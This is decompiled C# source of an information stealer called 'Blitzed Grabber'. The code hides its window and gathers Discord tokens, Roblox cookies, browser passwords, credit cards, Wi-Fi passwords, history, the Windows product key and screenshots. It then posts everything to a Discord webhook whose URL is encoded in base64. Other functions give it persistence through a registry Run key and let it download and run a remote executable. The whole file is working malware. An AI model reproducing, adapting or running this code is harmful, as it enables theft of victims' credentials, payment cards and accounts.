using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.Webhook;
using Microsoft.Win32;

namespace SnowGrabber
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000005 RID: 5
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		// Token: 0x06000006 RID: 6
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000007 RID: 7 RVA: 0x00002BE8 File Offset: 0x00000DE8
		public static void ProcessorInfo()
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
			if (registryKey != null && registryKey.GetValue("ProcessorNameString") != null)
			{
				Program.processName = registryKey.GetValue("ProcessorNameString").ToString();
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002C2C File Offset: 0x00000E2C
		public static void OSInfo()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (managementObject["Caption"] != null)
				{
					Program.osName = managementObject["Caption"].ToString();
				}
				if (managementObject["OSArchitecture"] != null)
				{
					Program.osArchitecture = managementObject["OSArchitecture"].ToString();
				}
				if (managementObject["Version"] != null)
				{
					Program.osVersion = managementObject["Version"].ToString();
				}
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002CEC File Offset: 0x00000EEC
		public static async Task MainAsync()
		{
			IntPtr consoleWindow = Program.GetConsoleWindow();
			Program.ShowWindow(consoleWindow, 0);
			try
			{
				File.Delete(Program.tempFolder + "\\Tokens.txt");
			}
			catch
			{
			}
			try
			{
				File.Delete(Program.tempFolder + "\\Historicals.txt");
			}
			catch
			{
			}
			WebhookObject webobj = new WebhookObject();
			webobj.AddEmbed(async delegate(EmbedBuilder builder)
			{
				builder.WithTitle("Blitzed Grabber V7").WithColor(Colors.Magenta).WithDescription("Heres The Info!").AddField("Time Logged", DateTime.Now.ToString(), false).WithFooter("Blitzed Grabber, Kyanite L.L.C", "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Font_Awesome_5_brands_discord_color.svg/800px-Font_Awesome_5_brands_discord_color.svg.png");
				if (Program.CheckPCGrabber)
				{
					try
					{
						Program.ProcessorInfo();
						Program.OSInfo();
						builder.AddField("PC Name", "```" + Environment.MachineName + "```", false);
						builder.AddField("Processor", "```" + Program.processName + "```", false);
						builder.AddField("OS Name", "```" + Program.osName + "```", false);
						builder.AddField("Architecture ", "```" + Program.osArchitecture + "```", false);
						builder.AddField("OS Version ", "```" + Program.osVersion + "```", false);
					}
					catch
					{
					}
				}
				if (Program.CheckProductKey)
				{
					try
					{
						builder.AddField("Product Key", "```" + Program.ProductKey.GetWindowsProductKeyFromRegistry().ToString() + "```", false);
					}
					catch
					{
					}
				}
			});
			if (Program.CheckScreenShot)
			{
				try
				{
					await Program.Screenshotting.SendScreenshot();
				}
				catch (Exception value)
				{
					Console.Write(value);
				}
			}
			WebhookObject sec = new WebhookObject();
			sec.AddEmbed(async delegate(EmbedBuilder builder)
			{
				builder.WithTitle("Blitzed Grabber V7").WithColor(Colors.Magenta).WithDescription("Misc Stuff").AddField("Time Logged", DateTime.Now.ToString(), false).WithFooter("Blitzed Grabber, Kyanite L.L.C", "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Font_Awesome_5_brands_discord_color.svg/800px-Font_Awesome_5_brands_discord_color.svg.png");
				if (Program.CheckWifi)
				{
					try
					{
						string exploitDir = Program.WifiStealing.Handler.ExploitDir;
						string[] profiles = Program.WifiStealing.Wifi.GetProfiles();
						foreach (string profile in profiles)
						{
							builder.AddField("WIFI Password", "```" + Program.WifiStealing.Wifi.GetWifiPassword(profile) + "```", false);
						}
						Program.WifiStealing.SendWifi();
					}
					catch
					{
					}
				}
				if (Program.CheckRobloxCookie)
				{
					try
					{
						builder.AddField("Roblox Cookie", "```" + Program.Roblox.RobloxCookie() + "```", false);
					}
					catch
					{
					}
				}
			});
			if (Program.CheckMinecraft)
			{
				try
				{
					Program.MinecraftRobber.GetMinecraft();
				}
				catch
				{
				}
			}
			if (Program.CheckDiscordTokens)
			{
				try
				{
					await Program.DiscordTokens.GrabTokens();
				}
				catch (Exception value2)
				{
					Console.Write(value2);
				}
			}
			if (Program.CheckPasswords)
			{
				try
				{
					Program.Passwords.RunPass();
				}
				catch
				{
				}
			}
			if (Program.CheckStartup)
			{
				try
				{
					Program.OnPower();
				}
				catch
				{
				}
			}
			if (Program.CheckRStartup)
			{
				try
				{
					Program.RPower();
				}
				catch
				{
				}
			}
			if (Program.CheckFakeMercurial)
			{
				try
				{
					Program.FakeMerc();
				}
				catch (Exception value3)
				{
					Console.WriteLine(value3);
				}
			}
			if (Program.CheckCreditCard)
			{
				try
				{
					Program.RunCC();
				}
				catch
				{
				}
			}
			await new Webhook(Program.WebhookURL, null, null).SendAsync(webobj);
			await new Webhook(Program.WebhookURL, null, null).SendAsync(sec);
			if (Program.CheckHistory)
			{
				Program.Historical.RunHis();
			}
			if (Program.CheckMeltStub)
			{
				try
				{
					Program.Extra.MeltStub();
				}
				catch
				{
				}
			}
			if (Program.CheckRestartPC)
			{
				try
				{
					Program.ShutOffs.RestartPC();
				}
				catch
				{
				}
			}
			if (Program.CheckShutOffPC)
			{
				try
				{
					Program.ShutOffs.ShutDownPC();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002D2C File Offset: 0x00000F2C
		public static List<Program.CreditCard> GetCC(string sWebData)
		{
			List<Program.CreditCard> result;
			try
			{
				List<Program.CreditCard> list = new List<Program.CreditCard>();
				Program.SQLite sqlite = Program.SqlReader.ReadTable(sWebData, "credit_cards");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Program.CreditCard item = default(Program.CreditCard);
						item.sNumber = Program.Crypto.GetUTF8(Program.Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
						item.sExpYear = Program.Crypto.GetUTF8(sqlite.GetValue(i, 3));
						item.sExpMonth = Program.Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sName = Program.Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Program.Counter.CreditCards++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Program.CreditCard>();
			}
			return result;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002DFC File Offset: 0x00000FFC
		private static string FormatCreditCard(Program.CreditCard cCard)
		{
			return string.Format("Producer| {0}\nDigits|  {1}\nExp Date| {2}\nCard Holder| {3}\n\n", new object[]
			{
				Program.Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002E5C File Offset: 0x0000105C
		public static void RunCC()
		{
			foreach (string text in Program.Paths.sChromiumPswPaths)
			{
				string path;
				if (text.Contains("Opera Software"))
				{
					path = Program.Paths.appdata + text;
				}
				else
				{
					path = Program.Paths.lappdata + text;
				}
				if (Directory.Exists(path))
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						List<Program.CreditCard> cc = Program.GetCC(str + "\\Web Data");
						string exploitDir = Program.Handler.ExploitDir;
						if (cc.Count > 0)
						{
							foreach (Program.CreditCard cCard in cc)
							{
								File.WriteAllText(Program.tempFolder + "\\credits.txt", Program.FormatCreditCard(cCard) + "\n");
							}
						}
					}
				}
			}
			Program.SendCCs(Program.tempFolder + "\\credits.txt");
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002F7C File Offset: 0x0000117C
		public static void SendCCs(string loc)
		{
			string webhookURL = Program.WebhookURL;
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(loc);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Passwords.txt");
				httpClient.PostAsync(webhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002FF0 File Offset: 0x000011F0
		public static void FakeMerc()
		{
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile("https://cdn-104.anonfiles.com/5a0453R8xf/749bb61a-1648454208/Mercurial.exe", Program.tempFolder + "\\Mercurial.exe");
			}
			Process.Start(Program.tempFolder + "\\Mercurial.exe");
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00003050 File Offset: 0x00001250
		public static void SendHistory()
		{
			string path = Program.tempFolder + "\\Historicals.txt";
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(path);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "History.txt");
				httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000030D0 File Offset: 0x000012D0
		public static void OnPower()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey.SetValue("BlitzedGrabber", Application.ExecutablePath);
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00003100 File Offset: 0x00001300
		public static void RPower()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey.DeleteValue("BlitzedGrabber", false);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000312C File Offset: 0x0000132C
		public static void Main()
		{
			Task.Run(async delegate()
			{
				await Program.MainAsync();
			}).GetAwaiter().GetResult();
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00003168 File Offset: 0x00001368
		public static void HideFile(string path = null)
		{
			string fileName = path ?? Program.ExecutablePath;
			new FileInfo(fileName).Attributes |= FileAttributes.Hidden;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00003194 File Offset: 0x00001394
		public static string SussyBaka(string base64EncodedData)
		{
			byte[] bytes = Convert.FromBase64String(base64EncodedData);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x04000001 RID: 1
		public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");

		// Token: 0x04000002 RID: 2
		public static string WebhookURL = Program.SussyBaka("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY4ODM3OTk2NjI5NjIyODU0L1VzZDBEeTN2dDA1N1k3OExhUFVCSXJqMjlYOTJ6T2FkM3kzZUdob0lMWjh0eU5QT09LelBhWHhBelZJRU1xbHA4RVo1");

		// Token: 0x04000003 RID: 3
		public static string URLToOpen = "//URLTOOPEN//";

		// Token: 0x04000004 RID: 4
		public static List<string> tokenscopped = new List<string>();

		// Token: 0x04000005 RID: 5
		public static string processName = "Unknown Processor";

		// Token: 0x04000006 RID: 6
		public static string osName = "Unknown OS";

		// Token: 0x04000007 RID: 7
		public static string osArchitecture = "Unknown Architecture";

		// Token: 0x04000008 RID: 8
		public static string osVersion = "Unknown Version";

		// Token: 0x04000009 RID: 9
		public static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;

		// Token: 0x0400000A RID: 10
		public static bool CheckScreenShot = true;

		// Token: 0x0400000B RID: 11
		public static bool CheckDiscordTokens = true;

		// Token: 0x0400000C RID: 12
		public static bool CheckRobloxCookie = true;

		// Token: 0x0400000D RID: 13
		public static bool CheckRobloxCookieGame = false;

		// Token: 0x0400000E RID: 14
		public static bool CheckPasswords = true;

		// Token: 0x0400000F RID: 15
		public static bool CheckHistory = true;

		// Token: 0x04000010 RID: 16
		public static bool CheckHideFile = true;

		// Token: 0x04000011 RID: 17
		public static bool CheckProductKey = true;

		// Token: 0x04000012 RID: 18
		public static bool CheckMinecraft = true;

		// Token: 0x04000013 RID: 19
		public static bool CheckWifi = true;

		// Token: 0x04000014 RID: 20
		public static bool CheckRestartPC = false;

		// Token: 0x04000015 RID: 21
		public static bool CheckShutOffPC = false;

		// Token: 0x04000016 RID: 22
		public static bool CheckMeltStub = false;

		// Token: 0x04000017 RID: 23
		public static bool CheckPCGrabber = true;

		// Token: 0x04000018 RID: 24
		public static bool CheckStartup = false;

		// Token: 0x04000019 RID: 25
		public static bool CheckRStartup = false;

		// Token: 0x0400001A RID: 26
		public static bool CheckFakeMercurial = false;

		// Token: 0x0400001B RID: 27
		public static bool CheckCreditCard = true;

		// Token: 0x02000003 RID: 3
		internal struct CreditCard
		{
			// Token: 0x17000001 RID: 1
			// (get) Token: 0x0600001A RID: 26 RVA: 0x000026CD File Offset: 0x000008CD
			// (set) Token: 0x0600001B RID: 27 RVA: 0x000026D5 File Offset: 0x000008D5
			public string sNumber { get; set; }

			// Token: 0x17000002 RID: 2
			// (get) Token: 0x0600001C RID: 28 RVA: 0x000026DE File Offset: 0x000008DE
			// (set) Token: 0x0600001D RID: 29 RVA: 0x000026E6 File Offset: 0x000008E6
			public string sExpYear { get; set; }

			// Token: 0x17000003 RID: 3
			// (get) Token: 0x0600001E RID: 30 RVA: 0x000026EF File Offset: 0x000008EF
			// (set) Token: 0x0600001F RID: 31 RVA: 0x000026F7 File Offset: 0x000008F7
			public string sExpMonth { get; set; }

			// Token: 0x17000004 RID: 4
			// (get) Token: 0x06000020 RID: 32 RVA: 0x00002700 File Offset: 0x00000900
			// (set) Token: 0x06000021 RID: 33 RVA: 0x00002708 File Offset: 0x00000908
			public string sName { get; set; }
		}

		// Token: 0x02000004 RID: 4
		public class ProductKey
		{
			// Token: 0x06000022 RID: 34 RVA: 0x00003350 File Offset: 0x00001550
			public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
			{
				string text = string.Empty;
				byte b = digitalProductId[66] / 6 & 1;
				digitalProductId[66] = ((digitalProductId[66] & 247) | (b & 2) * 4);
				int num = 0;
				for (int i = 24; i >= 0; i--)
				{
					int num2 = 0;
					for (int j = 14; j >= 0; j--)
					{
						num2 *= 256;
						num2 = (int)digitalProductId[j + 52] + num2;
						digitalProductId[j + 52] = (byte)(num2 / 24);
						num2 %= 24;
						num = num2;
					}
					text = "BCDFGHJKMPQRTVWXY2346789"[num2] + text;
				}
				string str = text.Substring(1, num);
				string str2 = text.Substring(num + 1, text.Length - (num + 1));
				text = str + "N" + str2;
				for (int k = 5; k < text.Length; k += 6)
				{
					text = text.Insert(k, "-");
				}
				return text;
			}

			// Token: 0x06000023 RID: 35 RVA: 0x0000343C File Offset: 0x0000163C
			private static string DecodeProductKey(byte[] digitalProductId)
			{
				char[] array = new char[]
				{
					'B',
					'C',
					'D',
					'F',
					'G',
					'H',
					'J',
					'K',
					'M',
					'P',
					'Q',
					'R',
					'T',
					'V',
					'W',
					'X',
					'Y',
					'2',
					'3',
					'4',
					'6',
					'7',
					'8',
					'9'
				};
				char[] array2 = new char[29];
				ArrayList arrayList = new ArrayList();
				for (int i = 52; i <= 67; i++)
				{
					arrayList.Add(digitalProductId[i]);
				}
				for (int j = 28; j >= 0; j--)
				{
					if ((j + 1) % 6 == 0)
					{
						array2[j] = '-';
					}
					else
					{
						int num = 0;
						for (int k = 14; k >= 0; k--)
						{
							int num2 = num << 8 | (int)((byte)arrayList[k]);
							arrayList[k] = (byte)(num2 / 24);
							num = num2 % 24;
							array2[j] = array[num];
						}
					}
				}
				return new string(array2);
			}

			// Token: 0x06000024 RID: 36 RVA: 0x000034F8 File Offset: 0x000016F8
			private static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, Program.ProductKey.DigitalProductIdVersion digitalProductIdVersion)
			{
				if (digitalProductIdVersion == Program.ProductKey.DigitalProductIdVersion.Windows8AndUp)
				{
					return Program.ProductKey.DecodeProductKeyWin8AndUp(digitalProductId);
				}
				return Program.ProductKey.DecodeProductKey(digitalProductId);
			}

			// Token: 0x06000025 RID: 37 RVA: 0x00003520 File Offset: 0x00001720
			public static string GetWindowsProductKeyFromRegistry()
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
				object value = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("DigitalProductId");
				if (value == null)
				{
					return "Failed to get DigitalProductId from registry";
				}
				byte[] digitalProductId = (byte[])value;
				registryKey.Close();
				bool flag = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
				Program.Counter.ProductKey = true;
				return Program.ProductKey.GetWindowsProductKeyFromDigitalProductId(digitalProductId, flag ? Program.ProductKey.DigitalProductIdVersion.Windows8AndUp : Program.ProductKey.DigitalProductIdVersion.UpToWindows7);
			}

			// Token: 0x02000005 RID: 5
			public enum DigitalProductIdVersion
			{
				// Token: 0x04000024 RID: 36
				UpToWindows7,
				// Token: 0x04000025 RID: 37
				Windows8AndUp
			}
		}

		// Token: 0x02000006 RID: 6
		public static class cBCrypt
		{
			// Token: 0x06000027 RID: 39
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

			// Token: 0x06000028 RID: 40
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

			// Token: 0x06000029 RID: 41
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

			// Token: 0x0600002A RID: 42
			[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
			internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

			// Token: 0x0600002B RID: 43
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

			// Token: 0x0600002C RID: 44
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptDestroyKey(IntPtr hKey);

			// Token: 0x0600002D RID: 45
			[DllImport("bcrypt.dll")]
			internal static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref Program.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

			// Token: 0x04000026 RID: 38
			public const uint ERROR_SUCCESS = 0U;

			// Token: 0x04000027 RID: 39
			public const uint BCRYPT_PAD_PSS = 8U;

			// Token: 0x04000028 RID: 40
			public const uint BCRYPT_PAD_OAEP = 4U;

			// Token: 0x04000029 RID: 41
			public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(1296188491);

			// Token: 0x0400002A RID: 42
			public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";

			// Token: 0x0400002B RID: 43
			public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";

			// Token: 0x0400002C RID: 44
			public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

			// Token: 0x0400002D RID: 45
			public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";

			// Token: 0x0400002E RID: 46
			public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";

			// Token: 0x0400002F RID: 47
			public static readonly string BCRYPT_AES_ALGORITHM = "AES";

			// Token: 0x04000030 RID: 48
			public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

			// Token: 0x04000031 RID: 49
			public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 1;

			// Token: 0x04000032 RID: 50
			public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

			// Token: 0x04000033 RID: 51
			public static readonly uint STATUS_AUTH_TAG_MISMATCH = 3221266434U;

			// Token: 0x02000007 RID: 7
			public struct BCRYPT_PSS_PADDING_INFO
			{
				// Token: 0x0600002F RID: 47 RVA: 0x00002711 File Offset: 0x00000911
				public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
				{
					this.pszAlgId = pszAlgId;
					this.cbSalt = cbSalt;
				}

				// Token: 0x04000034 RID: 52
				[MarshalAs(UnmanagedType.LPWStr)]
				public string pszAlgId;

				// Token: 0x04000035 RID: 53
				public int cbSalt;
			}

			// Token: 0x02000008 RID: 8
			public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
			{
				// Token: 0x06000030 RID: 48 RVA: 0x0000363C File Offset: 0x0000183C
				public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
				{
					this = default(Program.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
					this.dwInfoVersion = Program.cBCrypt.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
					this.cbSize = Marshal.SizeOf(typeof(Program.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
					if (iv != null)
					{
						this.cbNonce = iv.Length;
						this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
						Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
					}
					if (aad != null)
					{
						this.cbAuthData = aad.Length;
						this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
						Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
					}
					if (tag != null)
					{
						this.cbTag = tag.Length;
						this.pbTag = Marshal.AllocHGlobal(this.cbTag);
						Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
						this.cbMacContext = tag.Length;
						this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
					}
				}

				// Token: 0x06000031 RID: 49 RVA: 0x0000371C File Offset: 0x0000191C
				public void Dispose()
				{
					if (this.pbNonce != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbNonce);
					}
					if (this.pbTag != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbTag);
					}
					if (this.pbAuthData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbAuthData);
					}
					if (this.pbMacContext != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(this.pbMacContext);
					}
				}

				// Token: 0x04000036 RID: 54
				public int cbSize;

				// Token: 0x04000037 RID: 55
				public int dwInfoVersion;

				// Token: 0x04000038 RID: 56
				public IntPtr pbNonce;

				// Token: 0x04000039 RID: 57
				public int cbNonce;

				// Token: 0x0400003A RID: 58
				public IntPtr pbAuthData;

				// Token: 0x0400003B RID: 59
				public int cbAuthData;

				// Token: 0x0400003C RID: 60
				public IntPtr pbTag;

				// Token: 0x0400003D RID: 61
				public int cbTag;

				// Token: 0x0400003E RID: 62
				public IntPtr pbMacContext;

				// Token: 0x0400003F RID: 63
				public int cbMacContext;

				// Token: 0x04000040 RID: 64
				public int cbAAD;

				// Token: 0x04000041 RID: 65
				public long cbData;

				// Token: 0x04000042 RID: 66
				public int dwFlags;
			}

			// Token: 0x02000009 RID: 9
			public struct BCRYPT_KEY_LENGTHS_STRUCT
			{
				// Token: 0x04000043 RID: 67
				public int dwMinLength;

				// Token: 0x04000044 RID: 68
				public int dwMaxLength;

				// Token: 0x04000045 RID: 69
				public int dwIncrement;
			}

			// Token: 0x0200000A RID: 10
			public struct BCRYPT_OAEP_PADDING_INFO
			{
				// Token: 0x06000032 RID: 50 RVA: 0x00002721 File Offset: 0x00000921
				public BCRYPT_OAEP_PADDING_INFO(string alg)
				{
					this.pszAlgId = alg;
					this.pbLabel = IntPtr.Zero;
					this.cbLabel = 0;
				}

				// Token: 0x04000046 RID: 70
				[MarshalAs(UnmanagedType.LPWStr)]
				public string pszAlgId;

				// Token: 0x04000047 RID: 71
				public IntPtr pbLabel;

				// Token: 0x04000048 RID: 72
				public int cbLabel;
			}
		}

		// Token: 0x0200000B RID: 11
		private class cAesGcm
		{
			// Token: 0x06000033 RID: 51 RVA: 0x000037A0 File Offset: 0x000019A0
			public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
			{
				IntPtr intPtr = this.OpenAlgorithmProvider(Program.cBCrypt.BCRYPT_AES_ALGORITHM, Program.cBCrypt.MS_PRIMITIVE_PROVIDER, Program.cBCrypt.BCRYPT_CHAIN_MODE_GCM);
				IntPtr hKey;
				IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
				Program.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new Program.cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
				byte[] array2;
				using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
				{
					byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
					int num = 0;
					uint num2 = Program.cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0);
					if (num2 != 0U)
					{
						throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", num2));
					}
					array2 = new byte[num];
					num2 = Program.cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
					if (num2 == Program.cBCrypt.STATUS_AUTH_TAG_MISMATCH)
					{
						throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
					}
					if (num2 != 0U)
					{
						throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", num2));
					}
				}
				Program.cBCrypt.BCryptDestroyKey(hKey);
				Marshal.FreeHGlobal(hglobal);
				Program.cBCrypt.BCryptCloseAlgorithmProvider(intPtr, 0U);
				return array2;
			}

			// Token: 0x06000034 RID: 52 RVA: 0x000038B4 File Offset: 0x00001AB4
			private int MaxAuthTagSize(IntPtr hAlg)
			{
				byte[] property = this.GetProperty(hAlg, Program.cBCrypt.BCRYPT_AUTH_TAG_LENGTH);
				return BitConverter.ToInt32(new byte[]
				{
					property[4],
					property[5],
					property[6],
					property[7]
				}, 0);
			}

			// Token: 0x06000035 RID: 53 RVA: 0x000038F4 File Offset: 0x00001AF4
			private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
			{
				IntPtr zero = IntPtr.Zero;
				uint num = Program.cBCrypt.BCryptOpenAlgorithmProvider(out zero, alg, provider, 0U);
				if (num != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", num));
				}
				byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
				num = Program.cBCrypt.BCryptSetAlgorithmProperty(zero, Program.cBCrypt.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0);
				if (num != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", num));
				}
				return zero;
			}

			// Token: 0x06000036 RID: 54 RVA: 0x00003964 File Offset: 0x00001B64
			private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
			{
				byte[] property = this.GetProperty(hAlg, Program.cBCrypt.BCRYPT_OBJECT_LENGTH);
				int num = BitConverter.ToInt32(property, 0);
				IntPtr intPtr = Marshal.AllocHGlobal(num);
				byte[] array = this.Concat(new byte[][]
				{
					Program.cBCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC,
					BitConverter.GetBytes(1),
					BitConverter.GetBytes(key.Length),
					key
				});
				uint num2 = Program.cBCrypt.BCryptImportKey(hAlg, IntPtr.Zero, Program.cBCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num, array, array.Length, 0U);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", num2));
				}
				return intPtr;
			}

			// Token: 0x06000037 RID: 55 RVA: 0x000039F8 File Offset: 0x00001BF8
			private byte[] GetProperty(IntPtr hAlg, string name)
			{
				int num = 0;
				uint num2 = Program.cBCrypt.BCryptGetProperty(hAlg, name, null, 0, ref num, 0U);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", num2));
				}
				byte[] array = new byte[num];
				num2 = Program.cBCrypt.BCryptGetProperty(hAlg, name, array, array.Length, ref num, 0U);
				if (num2 != 0U)
				{
					throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", num2));
				}
				return array;
			}

